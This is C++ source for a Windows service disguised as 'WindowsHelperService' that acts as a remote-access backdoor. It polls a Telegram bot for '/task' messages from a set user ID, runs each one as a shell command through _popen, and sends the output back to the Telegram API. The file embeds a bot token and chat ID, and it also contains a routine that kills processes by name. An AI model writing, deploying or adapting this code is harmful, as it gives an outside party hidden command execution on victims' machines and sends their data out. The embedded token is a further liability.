#include <iostream>
#include <fstream>
#include <windows.h>
#include <tchar.h>
#include <string>
#include <wininet.h>
#include <TlHelp32.h>
#include <sstream>
#include <array>
#include <memory>
#include <algorithm>


std::ofstream logFile("ServiceLog.txt", std::ios::out | std::ios::app);

void Log(const std::string& message) {
    if (logFile.is_open()) {
        logFile << message << std::endl;
    }
}

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
SC_HANDLE hSCManager = NULL;
SC_HANDLE hService = NULL;

void ServiceMain(int argc, LPTSTR* argv);
void ControlHandler(DWORD request);
int InitService();
void SendMessage(const std::wstring& message_text);
void OutputDebugStringWithMessage(const std::string& message);
std::wstring ConvertToWideString(const std::string& input);
std::string GetTelegramUpdates();
DWORD ServiceWorkerThread(LPVOID lpParam);

#ifdef UNICODE
#define SERVICE_NAME  L"WindowsHelperService"
#else
#define SERVICE_NAME  _T("WindowsHelperService")
#endif

int _tmain(int argc, _TCHAR* argv[])
{
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    Log("Service starting...");
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        DWORD error = GetLastError();
        if (error == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
            Log("Error: StartServiceCtrlDispatcher failed - The program is not running as a service");
        } else {
            Log("Error: StartServiceCtrlDispatcher failed with error code " + std::to_string(error));
        }
        return error;
    }

    Log("Service ended successfully");
    return 0;
}

void ServiceMain(int argc, LPTSTR* argv)
{
    Log("Entering ServiceMain");
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
    if (hStatus == NULL)
    {
        Log("Error: RegisterServiceCtrlHandler failed");
        return;
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    // The worker thread does the actual work of the service.
    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    if(hThread == NULL) {
        Log("Error: Worker thread creation failed");
    } else {
        Log("Worker thread created successfully");
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    Log("Exiting ServiceMain");
    return;
}

int InitService()
{
    Log("Initializing service");
    // Initialization code here
    return 0;
}

void ControlHandler(DWORD request)
{
    Log("Entering ControlHandler");
    switch(request) {
        case SERVICE_CONTROL_STOP:
            Log("Stopping service");
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            Log("Service stopped");
            break;
        default:
            Log("Request received: " + std::to_string(request));
            break;
    }
}

std::string ExtractTaskArgument(const std::string& json, long userId) {
    std::istringstream jsonStream(json);
    std::string line;
    std::string lastCommand;
    long lastUserId = 0;
    
    while (std::getline(jsonStream, line)) {
        if (line.find("\"id\":") != std::string::npos && line.find(std::to_string(userId)) != std::string::npos) {
            lastUserId = userId;
        }
        if (lastUserId == userId && line.find("\"text\":\"/") != std::string::npos) {
            lastCommand = line;
        }
    }

    // Извлекаем аргумент команды
    size_t commandStart = lastCommand.find("/task");
    if (commandStart != std::string::npos) {
        size_t argumentStart = commandStart + 5; // 5 - длина строки "/task"
        size_t argumentEnd = lastCommand.find("\"", argumentStart);
        if (argumentEnd != std::string::npos) {
            return lastCommand.substr(argumentStart, argumentEnd - argumentStart);
        }
    }
    return "";
}

void OutputDebugStringWithMessage(const std::string& message) {
    std::wstring wMessage = ConvertToWideString(message);
    OutputDebugStringW(wMessage.c_str() + '\n');
}


std::wstring ConvertToWideString(const std::string& input) {
    if (input.empty()) {
        return std::wstring();
    }
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), NULL, 0);
    std::wstring wstrTo(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), &wstrTo[0], sizeNeeded);
    return wstrTo;
}

void SendMessage(const std::wstring& message_text) {
    std::wstring urlBase = L"https://api.telegram.org/bot5658308935:AAHZpncxTTQJlnZ6CSWtoPuE6eoY04h3hWs/sendMessage?chat_id=304000003&text=";
    
    // Определите максимальную длину сообщения, которую сервер Telegram поддерживает
    const int maxMessageLength = 4096;

    // Проверьте, если сообщение слишком длинное
    if (message_text.length() > maxMessageLength) {
        std::wstring subMessage;
        size_t startPos = 0;

        while (startPos < message_text.length()) {
            // Получите подстроку длиной не более maxMessageLength
            subMessage = message_text.substr(startPos, maxMessageLength);

            // Постройте URL для отправки подстроки
            std::wstring fullUrl = urlBase + subMessage;

            HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) {
                OutputDebugStringWithMessage("Error: InternetOpenW failed");
                Log("Error: InternetOpenW failed");
                return;
            }

            HINTERNET hConnect = InternetOpenUrlW(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

            if (hConnect) {
                char buffer[4096];
                DWORD bytesRead;
                std::string serverResponse;

                OutputDebugStringWithMessage("Sending HTTP request...");
                while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                    serverResponse += std::string(buffer, bytesRead);
                }
                InternetCloseHandle(hConnect);

                OutputDebugStringWithMessage("Server Response: " + serverResponse);
                Log("Message sent successfully");
            } else {
                DWORD error = GetLastError();
                std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
                OutputDebugStringWithMessage(errorMsg);
                Log(errorMsg);
            }
            InternetCloseHandle(hInternet);

            // Перейдите к следующей части сообщения
            startPos += maxMessageLength;
        }
    } else {
        // Сообщение не слишком длинное, отправьте его как обычно
        std::wstring fullUrl = urlBase + message_text;

        HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            OutputDebugStringWithMessage("Error: InternetOpenW failed");
            Log("Error: InternetOpenW failed");
            return;
        }

        HINTERNET hConnect = InternetOpenUrlW(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

        if (hConnect) {
            char buffer[4096];
            DWORD bytesRead;
            std::string serverResponse;

            OutputDebugStringWithMessage("Sending HTTP request...");
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                serverResponse += std::string(buffer, bytesRead);
            }
            InternetCloseHandle(hConnect);

            OutputDebugStringWithMessage("Server Response: " + serverResponse);
            Log("Message sent successfully");
        } else {
            DWORD error = GetLastError();
            std::string errorMsg = "Failed to send message. Error code: " + std::to_string(error);
            OutputDebugStringWithMessage(errorMsg);
            Log(errorMsg);
        }
        InternetCloseHandle(hInternet);
    }
}


std::string GetTelegramUpdates() {
    std::string responseData;
    HINTERNET hInternet = InternetOpenW(L"TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "";
    }

    std::wstring url = L"https://api.telegram.org/bot5658308935:AAHZpncxTTQJlnZ6CSWtoPuE6eoY04h3hWs/getUpdates";
    HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hConnect) {
        char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            responseData.append(buffer, bytesRead);
        }
        InternetCloseHandle(hConnect);
    } else {
    }
    InternetCloseHandle(hInternet);

    return responseData;
}

std::string extractBetween(const std::string& str, const std::string& startDelimiter, const std::string& stopDelimiter) {
    unsigned firstDelimPos = str.find(startDelimiter) + startDelimiter.length();
    unsigned endPos = str.find(stopDelimiter, firstDelimPos);
    return str.substr(firstDelimPos, endPos - firstDelimPos);
}


bool IsProcessRunning(const wchar_t* processName) {
    bool exists = false;
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32FirstW(snapshot, &entry)) {
        while (Process32NextW(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                exists = true;
                break;
            }
        }
    }

    CloseHandle(snapshot);
    return exists;
}

std::string ExecuteCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


void KillProcessByName(const wchar_t *filename) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32W pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
    while (hRes) {
        if (wcscmp(pEntry.szExeFile, filename) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32NextW(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}


DWORD ServiceWorkerThread(LPVOID lpParam) {
    SendMessage(L"Worker thread started\n"); // Отправляем сообщение о старте в Телеграм
    Log("Worker thread started");

    std::string lastExecutedArgument; // Переменная для хранения последнего выполненного аргумента

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) { // Отправляем сообщение о цикле проверки в Телеграм
        long userId = 304000003; // Замените на ID пользователя

        std::string json = GetTelegramUpdates();
        std::string argument = ExtractTaskArgument(json, userId);

        // Удаляем начальные и конечные пробелы из аргумента для сравнения
        argument.erase(std::begin(argument), std::find_if_not(argument.begin(), argument.end(), ::isspace));
        argument.erase(std::find_if_not(argument.rbegin(), argument.rend(), ::isspace).base(), argument.end());

        if (argument != "skip") { // Проверяем, что аргумент не равен "skip"
            std::string message = "Executing argument: " + argument;
            SendMessage(ConvertToWideString(message)); // Отправляем сообщение о выполнении аргумента в Телеграм
            Log(message);

            std::string output = ExecuteCommand(argument.c_str());
            SendMessage(ConvertToWideString(output)); // Отправляем вывод команды в Телеграм
            Log(output);
        }
        
        // Sleep for a while before checking again
        Sleep(20000); // Check every 20 seconds
    }
}


